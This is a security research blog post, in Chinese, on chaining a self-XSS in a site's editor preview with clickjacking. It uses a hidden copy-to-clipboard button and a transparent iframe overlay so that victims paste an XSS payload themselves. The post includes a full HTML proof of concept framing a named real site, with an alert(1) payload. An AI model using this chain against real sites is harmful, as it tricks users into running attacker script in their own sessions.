---
layout: post
author: Vulkey_Chen
title: "组合拳出击-Self型XSS变废为宝"
date: 2018-08-28
permalink: /archives/2018-08-28/1
description: "组合拳出击-Self型XSS变废为宝"
---

# 前言

作者：米斯特安全攻防实验室-Vulkey_Chen

博客：gh0st.cn


这是一个鸡肋性质的研究，也许有些标题党，请见谅～

本文启发于一些讨论，和自己脑子里冒出来的想法。



# 组合拳搭配

## Self型XSS

已知Self型XSS漏洞是这样的：

![self-xss](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2018-08-28/0x00.png)

相信看见图片基本上已经知道这个漏洞形成的原因了，该功能点有一个编辑预览的，输入XSS的payload就触发。

局限点在于这个漏洞是Self型(Myself)，也就是只能自己输入->自己触发漏洞。

## 变换思考

重新理一下这个漏洞触发的流程：

1.输入XSS payload: 

```html
<svg/onload=alert(1)>
```

2.触发

那么是否也可以理解为这样的一个触发流程：

1.XSS payload就在剪贴板中

2.黏贴到文本框

3.触发

也就是说在这里我只需要沿着这个流程向下拓展，是否可以让我变换的触发流程文字变成代码形式。

### 顺推流程

触发流程顺推为**攻击流程**：

1.诱导受害者点开连接

2.诱导受害者点击复制按钮

3.诱导受害者黏贴剪贴板的内容

4.顺利触发XSS漏洞

这一切的攻击流程看起来可操作性并不强，但实际上还是会有很多人中招。

### 搭配谁？

以上的攻击流程都需要在同一个页面中触发，那么就需要一个点击劫持的配合。

“**上天总是眷顾长得帅的人**”，在这里确实也存在着点击劫持的问题：

![http-response](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2018-08-28/0x01.png)

### 代码思考&构建

#### 复制功能

按流程来构建，首先构建复制到剪贴板的功能：

JavaScript有这样的功能，代码如下，自行 ”**食**“ 用：

```html
<script type="text/javascript">
function cpy(){
	var content=document.getElementById("test");//获取id为test的对象
	content.select();//全选内容
	document.execCommand("Copy");//执行复制命令到剪贴板
}
</script>
```

HTML代码如下：

```html
<input type="text" id="test" value='<svg/onload=alert(1)>'><br>
<input type="submit" value="test" onclick="cpy()">
```

界面如下：

![view](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2018-08-28/0x02.png)

问题：

**虽然作为一个PoC来说，不需要那么苛刻的要求PoC的严谨性，但这里处于研究探索的目的还是需要解决问题，如果input标签的内容显示出来，那么就很容易暴露本身的攻击。**

针对这类问题一开始我想到的是使用hidden属性构建为如下的HTML代码：

```html
<input type="hidden" id="test" value='<svg/onload=alert(1)>'><br>
<input type="submit" value="test" onclick="cpy()">
```

经过测试发现并不能成功的使用复制功能，我的理解是因为在JavaScript代码中有这样一段内容：

```javascript
...
content.select();//全选内容
...
```

既然是全选内容那么一定要有这样一个编辑框或者输入框的存在，所以使用Hidden从实际意义上是没有这样一个”**框**“的。

解决问题：

在这里我选择使用透明样式来从”**视觉上隐藏**“标签：

```html
<style type="text/css">
#test { /*css id选择器*/
    /*控制不透明度的属性，兼容各大浏览器*/
    filter: alpha(Opacity=0); /*提供给IE浏览器8之前的*/
    -moz-opacity: 0; /*提供给火狐浏览器的*/
    -webkit-opacity: 0; /*提供给webkit内核的*/
    -khtml-opacity: 0; /*提供给KHTML内核的*/
    -ms-filter: "progid:DXImageTransform.Microsoft.Alpha(Opacity=0)"; /*提供给IE8之后的*/
    opacity: 0;
    /*控制不透明度的属性，兼容各大浏览器*/
}
</style>
```

那么界面就变成如下的样子了：

![test](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2018-08-28/test.gif)

注意：**这里没办法使用自动复制到剪贴板，必须需要一个按钮才行**

#### 点击劫持

点击劫持之前写过一篇文章，所以就不在做讲解了，参考我之前写的一篇文章：http://gh0st.cn/archives/2017-12-20/1

构建基本CSS样式：

```css
.testframe {
	height: 100%;
} 
iframe {
	height: 100%;
	width: 100%;
	border: 0;
	margin: 0;
	padding: 0;
    /*控制不透明度的属性，兼容各大浏览器*/
    filter: alpha(Opacity=0); /*提供给IE浏览器8之前的*/
    -moz-opacity: 0; /*提供给火狐浏览器的*/
    -webkit-opacity: 0; /*提供给webkit内核的*/
    -khtml-opacity: 0; /*提供给KHTML内核的*/
    -ms-filter: "progid:DXImageTransform.Microsoft.Alpha(Opacity=0)"; /*提供给IE8之后的*/
    opacity: 0;
    /*控制不透明度的属性，兼容各大浏览器*/
}
#submit {
    position: fixed;
    width: 614px;
    height: 30px;
    margin: 0 auto;
    left: 0;
    right: 550px;
    display: block;
    top: 640px;
}
```

iframe框架&&输入框：

```html
<div class="testframe">
    <iframe src="https://website/New"></iframe>
    <input type="text" id="submit">
</div>
```

#### 最终PoC

```html
<html>
<head>
<style type="text/css"> 
.testframe {
	height: 100%;
} 
iframe {
	height: 100%;
	width: 100%;
	border: 0;
	margin: 0;
	padding: 0;
    /*控制不透明度的属性，兼容各大浏览器*/
    filter: alpha(Opacity=0); /*提供给IE浏览器8之前的*/
    -moz-opacity: 0; /*提供给火狐浏览器的*/
    -webkit-opacity: 0; /*提供给webkit内核的*/
    -khtml-opacity: 0; /*提供给KHTML内核的*/
    -ms-filter: "progid:DXImageTransform.Microsoft.Alpha(Opacity=0)"; /*提供给IE8之后的*/
    opacity: 0;
    /*控制不透明度的属性，兼容各大浏览器*/
}
#test {
    /*控制不透明度的属性，兼容各大浏览器*/
    filter: alpha(Opacity=0); /*提供给IE浏览器8之前的*/
    -moz-opacity: 0; /*提供给火狐浏览器的*/
    -webkit-opacity: 0; /*提供给webkit内核的*/
    -khtml-opacity: 0; /*提供给KHTML内核的*/
    -ms-filter: "progid:DXImageTransform.Microsoft.Alpha(Opacity=0)"; /*提供给IE8之后的*/
    opacity: 0;
    /*控制不透明度的属性，兼容各大浏览器*/
}
#submit {
    position: fixed;
    width: 614px;
    height: 30px;
    margin: 0 auto;
    left: 0;
    right: 550px;
    display: block;
    top: 640px;
}
</style>
</head>
<body>
<input type="text" id="test" value='<svg/onload=alert(1)>'><br>
<input type="submit" value="test" onclick="cpy()">
<div class="testframe">
    <input type="text" id="submit">
	<iframe id="test0" src="https://secquan.org/New"></iframe>
</div>
<script type="text/javascript">
function cpy(){
    var content=document.getElementById("test");
    content.select();
    document.execCommand("Copy");
}
</script>
</body>
</html>
```

## 最终演示

![poc](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2018-08-28/poc.gif)

# 总结

比较打开脑洞的一次研究，苛刻的攻击条件其实在进行足够的丰富诱导下就会变得非常的有趣。
